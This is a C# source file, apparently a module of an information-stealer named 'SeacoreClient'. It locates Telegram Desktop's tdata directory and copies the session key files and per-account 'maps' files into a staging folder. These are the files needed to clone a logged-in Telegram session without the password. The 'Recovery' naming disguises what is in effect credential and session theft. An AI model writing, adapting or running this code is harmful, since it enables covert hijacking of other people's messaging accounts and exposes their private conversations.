using SeacoreClient.Features.Recovery.Utilities;

namespace SeacoreClient.Features.Recovery.Messenger.Telegram
{
    class TelegramRecovery
    {
        private static int sessionDirectoryIndex = 0;
        private static readonly string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static readonly string[] paths =
        [
            Path.Combine(local, "Telegram Desktop", "tdata"),
            Path.Combine(roaming, "Telegram Desktop", "tdata"),
        ];
        private static readonly string[] sessionDirectories = new string[2];

        public static void Telegram()
        {
            string tgpath = FindTgPath();
            if (string.IsNullOrEmpty(tgpath))
            {
                return;
            }

            UtilitiesCommon.InitializeRecoveryFolder();
            string recoveryPath = UtilitiesCommon.PrepareRecoveryFilePath("Messenger\\Telegram", "");

            var filesAndDirectories = Directory.EnumerateFileSystemEntries(tgpath, "*", SearchOption.TopDirectoryOnly);

            foreach (var entry in filesAndDirectories)
            {
                var name = Path.GetFileName(entry);

                if (Directory.Exists(entry) && name.Length == 16)
                {
                    WriteMaps(entry, name, recoveryPath);
                    sessionDirectories[sessionDirectoryIndex++] = entry;
                }
                else if (name.Length == 17)
                {
                    File.Copy(entry, Path.Combine(recoveryPath, name), overwrite: true);
                }
            }
        }

        static void WriteMaps(string directoryPath, string dirname, string recoveryPath)
        {
            string mapsPath = Path.Combine(directoryPath, "maps");
            if (Directory.Exists(mapsPath))
            {
                string logsDir = Path.Combine(recoveryPath, dirname);
                Directory.CreateDirectory(logsDir);
                foreach (var file in Directory.GetFiles(mapsPath))
                {
                    string destFile = Path.Combine(logsDir, Path.GetFileName(file));
                    File.Copy(file, destFile, overwrite: true);
                }
            }
        }

        static string FindTgPath()
        {
            foreach (var path in paths)
            {
                if (Directory.Exists(path))
                    return path;
            }
            return null;
        }
    }
}